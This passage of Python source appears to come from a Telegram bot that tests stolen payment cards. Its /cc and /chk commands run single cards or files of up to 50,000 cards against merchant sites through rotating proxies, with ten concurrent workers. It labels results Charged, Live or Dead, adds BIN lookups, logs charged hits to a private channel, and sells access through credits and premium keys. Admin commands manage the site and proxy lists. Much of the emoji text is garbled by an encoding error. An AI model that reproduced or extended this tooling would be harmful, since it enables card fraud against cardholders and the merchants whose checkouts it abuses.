async def broadcast_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    broadcast_msg = event.message.text.replace('/broadcast', '', 1).strip()
    if not broadcast_msg:
        return await event.reply(premium_emoji("鉂� Usage: <code>/broadcast message</code>"), parse_mode='html')
    
    premium_users = load_premium_users()
    credits_users = load_credits()
    
    all_user_ids = set()
    
    for uid_str in premium_users.keys():
        all_user_ids.add(int(uid_str))
    
    for uid_str in credits_users.keys():
        all_user_ids.add(int(uid_str))
    
    for uid in joined_users:
        all_user_ids.add(uid)
    
    for aid in ADMIN_IDS:
        all_user_ids.add(aid)
    
    sent = 0
    failed = 0
    
    status_msg = await event.reply(premium_emoji(f"馃攧 Broadcasting to {len(all_user_ids)} users..."), parse_mode='html')
    
    for uid in all_user_ids:
        try:
            await bot.send_message(uid, premium_emoji(f"馃摙 <b>Broadcast from Admin</b>\n\n{broadcast_msg}"), parse_mode='html')
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    
    await status_msg.edit(premium_emoji(f"鉁� <b>Broadcast Complete!</b>\n\nSent: {sent}\nFailed: {failed}"), parse_mode='html')

# ========== SINGLE CC CHECK (WITH FULL BIN FORMAT) ==========

@bot.on(events.NewMessage(pattern=r'^/cc(@\w+)?(\s+.*)?$'))
async def single_cc_check(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    # Rate limit check
    if not is_admin(user_id):
        allowed, wait_sec = check_rate_limit(user_id)
        if not allowed:
            return await event.reply(premium_emoji(f"鈴� <b>Slow down!</b> Wait <b>{wait_sec}s</b> before next check."), parse_mode='html')
    
    # Check if this is a group and if group checking is enabled
    is_group_check = event.is_group
    is_group_enabled_check = is_group_enabled(event.chat_id) if is_group_check else False
    
    # Allow free checking in enabled groups, otherwise require premium
    if not is_group_enabled_check and not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Premium Required!</b>\n\nUse /redeem to activate premium access."), parse_mode='html')
    
    if not is_group_enabled_check:
        current_credits = get_user_credits(user_id)
        if current_credits < 1:
            return await event.reply(premium_emoji("鉂� <b>Insufficient Credits!</b>\n\nYou need 1 credit to check a card.\nYour Credits: 0\n\nUse /redeemcredit CREDIT_KEY to add credits."), parse_mode='html')
    else:
        current_credits = "Free"
    
    sites = load_sites()
    proxies = load_proxies()
    
    if not sites:
        return await event.reply(premium_emoji("鉂� No sites available. Contact admin."), parse_mode='html')
    if not proxies:
        proxies = [None] # Use direct connection if no proxies available
    
    try:
        cc_input = re.sub(r'^/cc(@\w+)?(\s+)?', '', event.message.text).strip()
    except IndexError:
        return await event.reply(premium_emoji("鉂� Usage: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
    
    cards = extract_cc(cc_input)
    if not cards:
        return await event.reply(premium_emoji("鉂� Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
    
    card = cards[0]
    
    filter_info = f"\n馃幆 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"
    
    credit_display = f"{current_credits} (1 will be deducted)" if not is_group_enabled_check else "Free (Group Mode)"
    status_msg = await event.reply(premium_emoji(f"<b>馃挸 Nomi 饾樉饾櫇饾櫄饾櫂饾櫊饾櫄饾櫑 </b>\n<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>\n<b>馃攷 饾悅饾悺饾悶饾悳饾悿饾悽饾惂饾悹...</b>\n<blockquote>馃挸 Card: <code>{card}</code></blockquote>\n<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>\n{filter_info}\n<b>馃挵 Credits: {credit_display}</b>"), parse_mode='html')
    
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        
        # Only deduct credits if not in a free group check
        if not is_group_enabled_check:
            success, new_credits = deduct_credit(user_id)
        else:
            success = True
            new_credits = current_credits
        
        if result['status'] == 'Charged' or 'order completed' in result.get('message', '').lower() or '馃拵' in result.get('message', '') or 'order_placed' in result.get('message', '').lower() or 'ORDER_PLACED' in result.get('message', ''):
            status_emoji = "鉁�"
            status_text = "饾悅饾悺饾悮饾惈饾悹饾悶饾悵"
            hit_type = "CHARGED"
            # Send to PVT channel (ONLY CHARGED, with plan name)
            try:
                sender = await event.get_sender()
                username = sender.username if sender.username else None
                await send_log_to_channel(result['message'][:150], result.get('gateway', 'Unknown'), result.get('price', '-'), username, user_id)
            except:
                await send_log_to_channel(result['message'][:150], result.get('gateway', 'Unknown'), result.get('price', '-'), str(user_id), user_id)
        elif result['status'] == 'Approved':
            status_emoji = "馃枻"
            status_text = "饾悑饾悽饾惎饾悶"
            hit_type = "LIVE"
        else:
            status_emoji = "鉂�"
            status_text = "饾悆饾悶饾悮饾悵"
            hit_type = None
        
        remaining_credits = get_user_credits(user_id) if not is_group_enabled_check else "Free"
        
        final_resp = f"""<b>馃挸 #饾悞饾悋饾悗饾悘饾悎饾悈饾悩 </b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悋饾悽饾惌 饾悈饾惃饾惍饾惂饾悵!</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>馃挸 Card: <code>{card}</code></blockquote>
<blockquote>馃摑 Response: {result['message'][:150]}</blockquote>
<blockquote>馃寪 饾悊饾悮饾惌饾悶饾惏饾悮饾惒: 馃枻 {result.get('gateway', 'Unknown')} | 馃挵 {result.get('price', '-')}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悂饾悎饾悕 饾悎饾惂饾悷饾惃</b>
<pre>饾棔饾棞饾棥 饾棞饾椈饾棾饾椉: {brand} - {bin_type} - {level}
饾棔饾棶饾椈饾椄: {bank}
饾棖饾椉饾槀饾椈饾榿饾椏饾槅: {country} {flag}</pre>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
馃幆 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}
<b>馃挵 Credits Left: {remaining_credits}</b>

馃 <b>Bot By: <a href=\"tg://user?id=7415233736\">Mydev1</a></b>"""
        
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"鉂� Error checking card: {e}"), parse_mode='html')

# ========== MASS CHECK COMMAND (WITH FULL BIN FORMAT FOR HITS) ==========

@bot.on(events.NewMessage(pattern=r'^/chk(@\w+)?(\s+.*)?$'))
async def check_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    # Check if this is a group and if group checking is enabled
    is_group_check = event.is_group
    is_group_enabled_check = is_group_enabled(event.chat_id) if is_group_check else False
    
    # Allow free checking in enabled groups, otherwise require premium
    if not is_group_enabled_check and not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Premium Required!</b>\n\nUse /redeem to activate premium access."), parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply(premium_emoji("馃搶 Reply to a .txt file containing cards..."), parse_mode='html')
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply(premium_emoji("鉂� Please reply to a .txt file."), parse_mode='html')
    
    if not load_sites():
        return await event.reply(premium_emoji("鉂� No sites available. Contact admin."), parse_mode='html')
    if not load_proxies():
        return await event.reply(premium_emoji("鉂� No proxies available. Please add proxies."), parse_mode='html')
    
    status_msg = await event.reply(premium_emoji("馃珕 Processing your file..."), parse_mode='html')
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = extract_cc(content)
    
    if not cards:
        await status_msg.edit(premium_emoji("馃槨 No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return
    
    if len(cards) > 50000:
        await status_msg.edit(premium_emoji(f"馃 File contains {len(cards)} cards. Limiting to first 50000 cards."), parse_mode='html')
        cards = cards[:50000]
    
    os.remove(file_path)
    
    total_cards = len(cards)
    
    if not is_group_enabled_check:
        user_credits = get_user_credits(user_id)
        if user_credits < total_cards:
            return await status_msg.edit(premium_emoji(f"鉂� <b>Insufficient Credits!</b>\n\nYou need {total_cards} credits to check {total_cards} cards.\nYour available credits: {user_credits}\n\nUse /redeemcredit CREDIT_KEY to add more credits."), parse_mode='html')
    else:
        user_credits = "Free"
    
    filter_info = f"馃幆 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"
    credit_info = f"{user_credits} (Will deduct 1 per card)" if not is_group_enabled_check else "Free (Group Mode)"
    await status_msg.edit(premium_emoji(f"馃 Starting check for {total_cards} cards...\n{filter_info}\n馃挵 Credits: {credit_info}"), parse_mode='html')
    
    # Concurrent session protection
    if user_id in _user_active_sessions and not is_admin(user_id):
        return await status_msg.edit(premium_emoji("鈿狅笍 <b>You already have an active checking session!</b>\n\nWait for it to finish or use the 馃洃 Stop button."), parse_mode='html')
    _user_active_sessions[user_id] = True

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }
    
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        
        last_update_count = 0
        UPDATE_EVERY_CARDS = 10
        
        async def worker():
            nonlocal last_update_count
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                    
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                
                if not is_group_enabled_check:
                    success, new_credits = deduct_credit(user_id)
                else:
                    success = True
                    new_credits = "Free"
                
                is_charged = res['status'] == 'Charged' or 'order completed' in res.get('message', '').lower() or '馃拵' in res.get('message', '') or 'order_placed' in res.get('message', '').lower() or 'ORDER_PLACED' in res.get('message', '')
                
                if is_charged:
                    all_results['charged'].append(res)
                    record_hit(user_id, 'charged')
                    # Send to PVT channel (ONLY CHARGED, with plan name)
                    try:
                        sender = await event.get_sender()
                        username = sender.username if sender.username else None
                        await send_log_to_channel(res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'), username, user_id)
                    except:
                        await send_log_to_channel(res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'), str(user_id), user_id)
                    # Send real-time notification to user with FULL BIN FORMAT
                    await send_realtime_hit_to_user(user_id, "CHARGED", card, res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    record_hit(user_id, 'approved')
                    # Send real-time notification to user with FULL BIN FORMAT for LIVE hits
                    await send_realtime_hit_to_user(user_id, "LIVE", card, res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'))
                    # NO LOG TO PVT CHANNEL FOR LIVE HITS
                else:
                    all_results['dead'].append(res)
                    record_dead(user_id)
                    
                queue.task_done()
                
                if all_results['checked'] - last_update_count >= UPDATE_EVERY_CARDS:
                    last_update_count = all_results['checked']
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass
        
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
        
    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        _user_active_sessions.pop(user_id, None)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        await send_final_results(user_id, all_results)
        # Credits low warning after session ends
        if not is_group_enabled_check:
            await check_credits_low(user_id)

# ========== PROXY COMMANDS ==========

@bot.on(events.NewMessage(pattern=r'^/proxy(@\w+)?(\s+.*)?$'))
async def proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply(premium_emoji("鉂� `proxy.txt` is empty. Nothing to check."), parse_mode='html')
    
    status_msg = await event.reply(premium_emoji(f"馃枻 Checking {len(proxies)} proxies..."), parse_mode='html')
    
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            
            await status_msg.edit(premium_emoji(f"馃枻 Checking proxies...\n\n<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Dead:</b> {len(dead_proxies)}"), parse_mode='html')
        
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")
        
        summary_msg = f"鉁� <b>Proxy Check Complete!</b>\n\n<b>Total Proxies:</b> {len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Removed:</b> {len(dead_proxies)}\n\n<code>proxy.txt</code> has been updated with only working proxies."
        
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"鉂� An error occurred: {e}"), parse_mode='html')

# ========== USER PROXY COMMANDS ==========

@bot.on(events.NewMessage(pattern=r'^/setproxy(@\w+)?(\s+.*)?$'))
async def setproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    try:
        proxy = event.message.text.split(' ', 1)[1].strip()
    except IndexError:
        return await event.reply(premium_emoji("鉂� Usage: <code>/setproxy proxy_ip:port</code>\n\nExample: /setproxy 1.2.3.4:8080"), parse_mode='html')
    
    if add_user_proxy(user_id, proxy):
        await event.reply(premium_emoji(f"鉁� <b>Proxy added successfully!</b>\n\n<code>{proxy}</code>\n\nYou can now use /mcc command with this proxy."), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"鈿狅笍 <b>Proxy already exists!</b>\n\n<code>{proxy}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myproxy(@\w+)?(\s+.*)?$'))
async def myproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    user_proxies = get_user_specific_proxies(user_id)
    if not user_proxies:
        return await event.reply(premium_emoji("鉂� <b>You have no proxies set!</b>\n\nUse /setproxy to add a proxy."), parse_mode='html')
    
    proxy_list = "\n".join([f"<code>{p}</code>" for p in user_proxies])
    await event.reply(premium_emoji(f"<b>馃攳 Your Personal Proxies:</b>\n\n{proxy_list}\n\nTotal: {len(user_proxies)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/delmyproxy(@\w+)?(\s+.*)?$'))
async def delmyproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    try:
        proxy = event.message.text.split(' ', 1)[1].strip()
    except IndexError:
        return await event.reply(premium_emoji("鉂� Usage: <code>/delmyproxy proxy_ip:port</code>\n\nExample: /delmyproxy 1.2.3.4:8080"), parse_mode='html')
    
    if remove_user_proxy(user_id, proxy):
        await event.reply(premium_emoji(f"鉁� <b>Proxy removed!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"鉂� <b>Proxy not found!</b>\n\n<code>{proxy}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearmyproxy(@\w+)?(\s+.*)?$'))
async def clearmyproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    if clear_user_proxies(user_id):
        await event.reply(premium_emoji("鉁� <b>All your proxies have been cleared!</b>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("鈿狅笍 <b>You have no proxies to clear!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/site(@\w+)?(\s+.*)?$'))
async def site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    sites = load_sites()
    if not sites:
        return await event.reply(premium_emoji("鉂� `sites.txt` is empty. Nothing to check."), parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply(premium_emoji("鉂� No proxies available. Please add proxies."), parse_mode='html')
    
    status_msg = await event.reply(premium_emoji(f"馃枻 Checking {len(sites)} sites..."), parse_mode='html')
    
    alive_sites = []
    dead_sites = []
    batch_size = 10
    
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies: 
                fresh_proxies = proxies
            
            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await status_msg.edit(premium_emoji(f"馃枻 Checking sites...\n\n<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Dead:</b> {len(dead_sites)}"), parse_mode='html')
        
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        
        summary_msg = f"鉁� <b>Site Check Complete!</b>\n\n<b>Total Sites:</b> {len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Removed:</b> {len(dead_sites)}\n\n<code>sites.txt</code> has been updated."
        
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"鉂� An error occurred: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm(@\w+)?(\s+.*)?$'))
async def remove_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/rm https://site.com</code>"), parse_mode='html')
    
    url_to_remove = args[1].strip()
    success, msg = remove_site(url_to_remove)
    
    await event.reply(premium_emoji(f"{'鉁�' if success else '鉂�'} <b>{msg}</b>\n\n<code>{url_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearsite(@\w+)?(\s+.*)?$'))
async def clear_all_sites(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    current_sites = load_sites()
    count = len(current_sites)
    
    if count == 0:
        return await event.reply(premium_emoji("鉂� <code>sites.txt</code> is already empty."), parse_mode='html')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"sites_backup_{user_id}_{timestamp}.txt"
    
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for site in current_sites:
                await f.write(f"{site}\n")
        
        await event.reply(premium_emoji(f"馃摝 <b>Backup Created!</b>\n\nSending backup of {count} sites before clearing..."), file=backup_filename, parse_mode='html')
        
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as e:
        return await event.reply(premium_emoji(f"鉂� Error creating backup: {e}"), parse_mode='html')
    
    async with aiofiles.open(SITES_FILE, 'w') as f:
        await f.write("")
    
    await event.reply(premium_emoji(f"鉁� <b>Cleared all {count} sites!</b>\n\n<code>sites.txt</code> is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getsites(@\w+)?(\s+.*)?$'))
async def get_all_sites_cmd(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    current_sites = load_sites()
    if not current_sites:
        return await event.reply(premium_emoji("鉂� No sites in <code>sites.txt</code>"), parse_mode='html')
    
    if len(current_sites) <= 50:
        site_list = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(current_sites)])
        await event.reply(premium_emoji(f"<b>馃搵 All Sites ({len(current_sites)}):</b>\n\n{site_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sites_{user_id}_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w') as f:
            for i, site in enumerate(current_sites):
                await f.write(f"{i+1}. {site}\n")
        
        await event.reply(premium_emoji(f"<b>馃搵 All Sites ({len(current_sites)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
        
        try:
            os.remove(filename)
        except:
            pass

# ========== PROXY MANAGEMENT COMMANDS ==========

@bot.on(events.NewMessage(pattern=r'^/addproxy(@\w+)?(\s+.*)?$'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            return await event.reply(premium_emoji("鉂� Usage: `/addproxy` followed by proxies, one per line."), parse_mode='html')
        
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            return await event.reply(premium_emoji("鉂� No proxies provided."), parse_mode='html')
        
        current_proxies = load_proxies()
        new_proxies = []
        
        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)
        
        if not new_proxies:
            return await event.reply(premium_emoji("鈿狅笍 All provided proxies already exist in `proxy.txt`."), parse_mode='html')
        
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
        
        await event.reply(premium_emoji(f"鉁� **Proxies Added Successfully!**\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"鉂� Error adding proxies: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxytxt(@\w+)?(\s+.*)?$'))
async def add_proxy_txt_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("\U0001f6ab You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("\u274c <b>Admin only command!</b>"), parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply(premium_emoji("\U0001f4cc Reply to a .txt file with proxies (one per line)"), parse_mode='html')
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply(premium_emoji("\u274c Please reply to a .txt file"), parse_mode='html')
    
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception as e:
        try:
            os.remove(file_path)
        except:
            pass
        return await event.reply(premium_emoji(f"\u274c Error reading file: {e}"), parse_mode='html')
    
    proxies_to_add = [line.strip() for line in content.splitlines() if line.strip()]
    if not proxies_to_add:
        return await event.reply(premium_emoji("\u274c No valid proxies found in file"), parse_mode='html')
    
    current_proxies = load_proxies()
    new_proxies = [p for p in proxies_to_add if p not in current_proxies]
    already_exist = len(proxies_to_add) - len(new_proxies)
    
    if new_proxies:
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
    
    msg = f"<b>\U0001f4ca Proxies Processed</b>\n\n"
    msg += f"\u2705 Added: {len(new_proxies)}\n"
    msg += f"\u26a0\ufe0f Already existed: {already_exist}\n"
    msg += f"\U0001f4cb Total in file: {len(proxies_to_add)}"
    await event.reply(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy(@\w+)?(\s+.*)?$'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        return await event.reply(premium_emoji("鉂� Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
    
    status_msg = await event.reply(premium_emoji(f"馃攧 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"鉁� <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"鉂� <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"鉂� Error checking proxy: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy(@\w+)?(\s+.*)?$'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        return await event.reply(premium_emoji("鉂� Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
    
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        return await event.reply(premium_emoji(f"鉂� Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
    
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    
    await event.reply(premium_emoji(f"鉁� <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex(@\w+)?(\s+.*)?$'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        return await event.reply(premium_emoji("鉂� Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
    
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        return await event.reply(premium_emoji("鉂� Invalid indices. Use numbers separated by commas."), parse_mode='html')
    
    current_proxies = load_proxies()
    if not current_proxies:
        return await event.reply(premium_emoji("鉂� No proxies in proxy.txt"), parse_mode='html')
    
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    
    if not removed:
        return await event.reply(premium_emoji("鉂� No valid indices found."), parse_mode='html')
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    
    await event.reply(premium_emoji(f"鉁� <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy(@\w+)?(\s+.*)?$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    current_proxies = load_proxies()
    count = len(current_proxies)
    
    if count == 0:
        return await event.reply(premium_emoji("鉂� <code>proxy.txt</code> is already empty."), parse_mode='html')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        
